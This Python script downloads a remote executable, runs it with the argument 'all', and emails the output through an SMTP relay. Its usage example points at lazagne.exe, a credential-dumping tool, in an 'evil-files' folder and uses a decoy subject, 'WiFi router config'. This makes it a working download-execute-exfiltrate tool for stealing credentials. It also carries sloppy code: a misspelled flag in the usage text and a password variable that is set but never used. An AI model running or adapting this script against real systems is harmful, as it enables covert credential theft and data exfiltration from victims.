#!/usr/bin/env python

import os
import importlib.util
import argparse
import tempfile
import requests
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

'''
        Run the script by providing the required arguments:
        
        python download_execute_and_report.py --url http://192.168.100.210/evil-files/lazagne.exe \
            --subject 'WiFi router config' --smptp-servert 'smtp-relay.gmail.com' --smtp-port 587
'''

def import_module_from_path(path_to_module):
    spec = importlib.util.spec_from_file_location("module_name", path_to_module)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

def download(url):
    """Download a file from the given URL."""
    response = requests.get(url)
    filename = url.split('/')[-1]
    with open(filename, 'wb') as out_file:
        out_file.write(response.content)

    return filename


def send_mail(email, password, message, subject, smtp_server, smtp_port):
    """Send an email using the provided SMTP server and credentials."""
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, _subtype='plain', _charset='UTF-8'))

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg.as_string())
    server.quit()

def run_downloader_mailer(args):
    """Download file, execute it and then email the output."""
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)

    filename = download(args.url)
    command = f'{filename} all'
    std_output = subprocess.run(
        command, shell=True, stdout=subprocess.PIPE).stdout.decode('us-ascii')

    os.remove(filename)
    send_mail(args.email, args.password, std_output,
              args.subject, args.smtp_server, args.smtp_port)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='File Download and Run Script')
    parser.add_argument("-u", "--url", dest="url", required=True,
                        help="The URL of the file to download")
    parser.add_argument("-t", "--subject", dest="subject", required=True,
                        help="Subject of the email to be sent")
    parser.add_argument("-s", "--smtp-server", dest="smtp_server", required=True,
                        help="SMTP server to use for sending email")
    parser.add_argument("-p", "--smtp-port", dest="smtp_port", type=int,
                        required=True, help="SMTP port to use for sending email")
    parser.add_argument("-e", "--email", dest="email", type=str,
                        required=True, help="Email address to use for sending email")
    parser.add_argument("-f", "--pass-file", dest="pass_file", type=str, required=False,
                        help="Email address to use for sending email")
    parser.add_argument("-k", "--key", dest="key", type=str, required=False,
                        help="Key to use for decrypting the password")

    args = parser.parse_args()
    
     # Get the path to the directory above the current one
    parent_dir = os.path.abspath(os.path.join(os.getcwd(), os.pardir))
    # Build the full path to the module
    module_path = os.path.join(parent_dir, "../", "secrets_retreiver", "secrets_retreiver.py")
    # Use the function
    secrets_retreiver = import_module_from_path(module_path)
    secrets_retreiver_class = secrets_retreiver.SecretRetriever()

    # Enter the required parameters for the password manager
    vault_addr  = 'https://127.0.0.1:8200'
    vault_token = ''
    secret_path = 'tls/apitest'
    secret_key  = 'SMTP_PASSWORD'
    cert_priv   = '/tmp/vault/vault.crt'
    cert_key    = '/tmp/vault/vault.key' 
    cert_auth   = '/tmp/vault/vault.ca'

    # Collecting user's email and password securely
    args.password = secrets_retreiver_class.get_password_from_encrypted_file(args.pass_file, args.key)

    if args.pass_file and args.key:
        password = secrets_retreiver_class.get_password_from_encrypted_file(args.pass_file, args.key)
    else:
        password = secrets_retreiver_class.get_password_from_vault(
            vault_addr, vault_token, secret_path, secret_key)

    run_downloader_mailer(args)
